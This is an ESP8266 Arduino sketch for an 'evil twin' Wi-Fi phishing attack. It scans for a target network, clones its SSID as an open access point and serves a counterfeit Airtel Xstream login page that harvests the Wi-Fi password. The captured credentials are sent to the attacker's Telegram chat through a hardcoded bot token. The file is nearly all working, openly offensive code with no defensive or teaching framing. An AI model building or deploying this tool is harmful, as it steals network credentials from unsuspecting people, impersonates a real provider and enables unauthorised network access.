#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// 🔥 NO WiFiManager needed - Pure ESP8266 core libraries
const char* TELEGRAM_BOT_TOKEN = "8560004612:AAGG8sNRtXk_vUdTe5lRhT5ndTBAl_JMmhY";  // Replace
const char* TELEGRAM_CHAT_ID = "8560004612";      // Replace

const int LED_PIN = 2;  // D4 - External LED better
String targetSSID = "";
String targetBSSID = "";
String capturedCreds = "";
bool attackActive = false;

ESP8266WebServer server(80);

// Function prototypes
void sendTelegram(String msg);
void blinkSuccess();
void handleRoot();
void handleLogin();
void handleCSS();
void handleLogo();
String urlEncode(String str);

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);  // LED OFF
  
  Serial.println("\n🔥 ESP8266 EVIL TWIN DEBUG MODE");
  delay(2000);
  
  // Phase 1: SCAN
  wifiScan();
}

void loop() {
  if (!attackActive) return;
  
  server.handleClient();
  delay(10);
}

void wifiScan() {
  Serial.println("📡 SCANNING... (5s)");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  int n = WiFi.scanNetworks();
  Serial.printf("Found %d networks\n", n);
  
  // Find BIGGEST SSID
  int maxLen = 0;
  for (int i = 0; i < n; ++i) {
    String ssid = WiFi.SSID(i);
    int len = ssid.length();
    Serial.printf("  [%d] %s (%d chars) %d dBm\n", i+1, ssid.c_str(), len, WiFi.RSSI(i));
    
    if (len > maxLen && len > 8 && !ssid.startsWith("ESP") && !ssid.startsWith("pwned")) {
      maxLen = len;
      targetSSID = ssid;
      targetBSSID = WiFi.BSSIDstr(i);
    }
  }
  
  WiFi.scanDelete();
  
  if (targetSSID.length() > 0) {
    Serial.printf("🎯 TARGET: %s (%d chars)\n", targetSSID.c_str(), maxLen);
    sendTelegram("🎯 TARGET: " + targetSSID);
    startAttack();
  } else {
    Serial.println("❌ No good target. Retry in 30s");
    delay(30000);
    wifiScan();
  }
}

void startAttack() {
  Serial.println("🚀 EVIL TWIN STARTING...");
  
  // Create OPEN AP with TARGET SSID
  WiFi.mode(WIFI_AP);
  WiFi.softAP(targetSSID.c_str(), "", 1, 0, 8);  // Channel 1, no password, 8 clients
  
  Serial.println("📶 AP Started!");
  Serial.print("IP: "); Serial.println(WiFi.softAPIP());
  
  // Web server handlers
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/style.css", handleCSS);
  server.on("/logo.png", handleLogo);
  
  server.begin();
  attackActive = true;
  
  Serial.println("🌐 FAKE AIRTEL LOGIN READY!");
  Serial.println("📱 Connect to: " + targetSSID);
  sendTelegram("🚀 " + targetSSID + " ACTIVE | IP: " + WiFi.softAPIP().toString());
  
  // Blink 3 times - Ready signal
  for(int i=0; i<3; i++) {
    digitalWrite(LED_PIN, LOW); delay(200);
    digitalWrite(LED_PIN, HIGH); delay(200);
  }
}

void handleRoot() {
  Serial.println("👤 Victim connected: " + server.client().remoteIP().toString());
  
  String html = R"raw(
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>Airtel Xstream - WiFi Login</title>
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <div class="container">
    <div class="logo-box">
      <img src="/logo.png" alt="Airtel" class="logo">
    </div>
    <h1>Airtel Xstream Fiber</h1>
    <form action="/login" method="POST">
      <div class="input-group">
        <input type="text" name="ssid" value=)raw" + targetSSID + R"raw(" readonly>
        <label>WiFi Network</label>
      </div>
      <div class="input-group">
        <input type="password" name="pass" placeholder="Enter WiFi Password" required>
        <label>Password</label>
      </div>
      <button type="submit">Connect to WiFi</button>
    </form>
    <p class="info">Secure connection | Airtel Broadband</p>
  </div>
</body>
</html>
  )raw";
  
  server.send(200, "text/html", html);
}

void handleLogin() {
  String ssid = server.arg("ssid");
  String pass = server.arg("pass");
  
  capturedCreds = "SSID: " + ssid + " | PASS: " + pass;
  Serial.println("🎣 CAPTURED: " + capturedCreds);
  
  sendTelegram("🔥 GOTCHA! " + capturedCreds);
  
  // Fake success page
  String html = R"raw(
<!DOCTYPE html>
<html><head>
<meta http-equiv="refresh" content="3;url=https://www.airtel.in">
<title>Connected!</title>
<style>body{background:#00a651;color:white;text-align:center;padding:50px;font-family:Arial}
h1{font-size:2em;margin:0}</style>
</head><body>
<h1>✅ WiFi Connected Successfully!</h1>
<p>Redirecting to Airtel Home...</p>
</body></html>
  )raw";
  
  server.send(200, "text/html", html);
  
  // 40 BLINKS = MISSION SUCCESS!
  blinkSuccess();
}

void handleCSS() {
  String css = R"css(
body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#ff6b35,#f7931e);margin:0;height:100vh;display:flex;align-items:center;justify-content:center}
.container{max-width:380px;width:90%;background:hsla(0,0%,100%,.95);padding:40px;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.3);text-align:center}
.logo-box{margin-bottom:30px}
.logo{width:70px;height:70px;border-radius:50%;box-shadow:0 5px 15px rgba(0,0,0,.2)}
h1{color:#333;font-size:28px;margin:0 0 30px;font-weight:300}
.input-group{position:relative;margin:20px 0}
input{width:100%;padding:15px 20px;border:none;border-radius:12px;font-size:16px;box-sizing:border-box;background:#f8f9fa;box-shadow:inset 0 2px 5px rgba(0,0,0,.1)}
input[readonly]{background:#e9ecef;color:#666}
input:focus{outline:none;box-shadow:0 0 0 3px rgba(255,107,53,.3)}
button{width:100%;padding:16px;background:#00a651;color:white;border:none;border-radius:12px;font-size:18px;font-weight:600;cursor:pointer;transition:.3s}
button:hover{background:#008c44;transform:translateY(-2px)}
.info{color:#666;font-size:14px;margin-top:20px}
  )css";
  server.send(200, "text/css", css);
}

void handleLogo() {
  // Simple Airtel logo SVG
  String svg = R"svg(
<svg width="70" height="70" viewBox="0 0 70 70" xmlns="http://www.w3.org/2000/svg">
  <circle cx="35" cy="35" r="33" fill="#FF6B35"/>
  <text x="35" y="42" font-family="Arial" font-size="16" font-weight="bold" fill="white" text-anchor="middle">AIRTEL</text>
  <text x="35" y="52" font-family="Arial" font-size="8" fill="rgba(255,255,255,.8)" text-anchor="middle">Xstream</text>
</svg>
  )svg";
  server.send(200, "image/svg+xml", svg);
}

void sendTelegram(String message) {
  WiFiClientSecure client;
  HTTPClient http;
  
  http.begin(client, "https://api.telegram.org/bot" + String(TELEGRAM_BOT_TOKEN) + 
             "/sendMessage?chat_id=" + String(TELEGRAM_CHAT_ID) + "&text=" + urlEncode(message));
  
  int code = http.POST("");
  Serial.printf("Telegram: %d\n", code);
  http.end();
}

void blinkSuccess() {
  Serial.println("✅ 40 BLINKS - SUCCESS!");
  sendTelegram("✅ MISSION COMPLETE!");
  
  for(int i = 0; i < 40; i++) {
    digitalWrite(LED_PIN, LOW);   // ON
    delay(120);
    digitalWrite(LED_PIN, HIGH);  // OFF
    delay(120);
  }
  
  Serial.println("💀 Device ready for shutdown");
}

String urlEncode(String str) {
  String encoded = "";
  for(size_t i = 0; i < str.length(); i++) {
    char c = str[i];
    if(isAlphaNumeric(c)) {
      encoded += c;
    } else {
      encoded += '%' + String((uint8_t)c >> 4, HEX) + String((uint8_t)c & 0xF, HEX);
    }
  }
  return encoded;
}
